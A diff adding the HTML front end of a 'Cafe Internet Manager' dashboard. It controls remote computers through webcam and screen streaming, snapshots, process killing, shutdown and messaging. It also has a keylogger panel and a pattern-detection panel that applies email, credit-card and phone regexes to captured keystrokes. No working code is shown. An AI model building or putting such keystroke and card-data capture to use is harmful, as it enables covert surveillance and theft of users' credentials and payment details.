@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cafe Internet Manager</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+  <script type="module" crossorigin src="/assets/index-GY4cLshL.js"></script>
+  <link rel="stylesheet" crossorigin href="/assets/index-DahtRBH3.css">
+</head>
+<body>
+    <div class="app-container">
+        <aside class="sidebar">
+            <div class="logo-icon">🛡️</div>
+            <nav>
+                <button class="nav-item active" id="navDashboard" title="Computers">
+                    <span class="material-icons">desktop_windows</span>
+                </button>
+                <button class="nav-item" id="navSettings" title="Settings">
+                    <span class="material-icons">settings</span>
+                </button>
+            </nav>
+        </aside>
+
+        <main class="workspace">
+            <div id="viewDashboard" class="view-section active">
+                <header class="top-bar">
+                    <h1 class="page-title">Dashboard</h1>
+                    <button id="addMachineBtn" class="btn btn-primary">
+                        <span class="material-icons">add</span> Add Computer
+                    </button>
+                </header>
+                <div class="dashboard-content">
+                    <div class="tabs">
+                        <button class="tab active">Computers</button>
+                        <button class="tab">Settings</button>
+                    </div>
+                    <div class="machine-grid" id="machineGrid">
+                        </div>
+                </div>
+            </div>
+
+            <div id="viewStream" class="view-section hidden">
+                <header class="stream-top-bar">
+                    <button id="backBtn" class="btn btn-text">
+                        <span class="material-icons">arrow_back</span> Back
+                    </button>
+                    <div class="machine-info">
+                        <h2 id="currentMachineName">Machine Name</h2>
+                        <div class="connection-status">
+                            Connection Status <span class="status-dot" id="connectionDot"></span>
+                        </div>
+                    </div>
+                    <div class="stream-controls">
+                        <button id="btnStart" class="btn-control" title="Webcam stream (reliable)">
+                            <span class="material-icons icon-play">play_circle_filled</span> Stream
+                        </button>
+                        <button id="btnStartScreen" class="btn-control" title="Screen stream (may need permissions)">
+                            <span class="material-icons">desktop_windows</span> Screen
+                        </button>
+                        <button id="btnStop" class="btn-control">
+                            <span class="material-icons icon-stop">stop_circle</span> Stop
+                        </button>
+                        <button id="btnSnap" class="btn-control">
+                            <span class="material-icons icon-snap">camera_alt</span> Snap
+                        </button>
+                        <button id="btnListProc" class="btn-control">
+                            <span class="material-icons">list</span> Procs
+                        </button>
+                    </div>
+                </header>
+                
+                <div class="stream-body">
+                    <div class="stream-player-container">
+                        <canvas id="screenCanvas"></canvas>
+                    </div>
+
+                    <div class="message-panel">
+                        <!-- Keylogger Section -->
+                        <div class="keylogger-section">
+                            <div class="section-header">
+                                <h4>⌨️ Keyboard Monitor</h4>
+                                <div class="keylogger-controls">
+                                    <button id="btnStartKeylogger" class="btn-sm btn-success">Start</button>
+                                    <button id="btnStopKeylogger" class="btn-sm btn-danger">Stop</button>
+                                </div>
+                            </div>
+                            <div id="keylogDisplay" class="keylog-display"></div>
+                        </div>
+
+                        <!-- Pattern Detection Section -->
+                        <div class="pattern-section">
+                            <div class="section-header">
+                                <h4>🔍 Pattern Detection</h4>
+                                <div class="pattern-controls">
+                                    <button id="btnAddCommonPatterns" class="btn-sm btn-primary" title="Add email, credit card, phone, IP, URL patterns">Common</button>
+                                    <button id="btnClearPatterns" class="btn-sm btn-secondary">Clear</button>
+                                </div>
+                            </div>
+                            <div class="pattern-input-row">
+                                <input type="text" id="patternName" placeholder="Name" class="pattern-name-input">
+                                <input type="text" id="patternRegex" placeholder="Regex pattern" class="pattern-regex-input">
+                                <button id="btnAddPattern" class="btn-sm btn-success">Add</button>
+                            </div>
+                            <div id="patternMatchDisplay" class="pattern-match-display">
+                                <div class="pattern-placeholder">Pattern matches will appear here...</div>
+                            </div>
+                        </div>
+
+                        <!-- Process Control Section -->
+                        <div class="process-section">
+                            <div class="section-header">
+                                <h4>📋 Process Control</h4>
+                            </div>
+                            <div class="kill-process-row">
+                                <input type="number" id="pidInput" placeholder="PID" class="pid-input">
+                                <button id="btnKillProcess" class="btn-sm btn-danger">Kill</button>
+                            </div>
+                        </div>
+
+                        <!-- System Section -->
+                        <div class="system-section">
+                            <div class="section-header">
+                                <h4>⚙️ System</h4>
+                            </div>
+                            <button id="btnShutdown" class="btn-control btn-shutdown">
+                                <span class="material-icons">power_settings_new</span> Shutdown
+                            </button>
+                        </div>
+
+                        <div class="message-history" id="messageHistory">
+                            </div>
+                        <div class="message-input-area">
+                            <input type="text" id="messageInput" placeholder="Type a message...">
+                            <button id="sendMessageBtn" class="btn-send">
+                                <span class="material-icons">send</span>
+                            </button>
+                        </div>
+                        <div class="message-logs">
+                            <h4>Messages Log</h4>
+                            <ul id="messageLogList">
+                                </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+</body>
+</html>
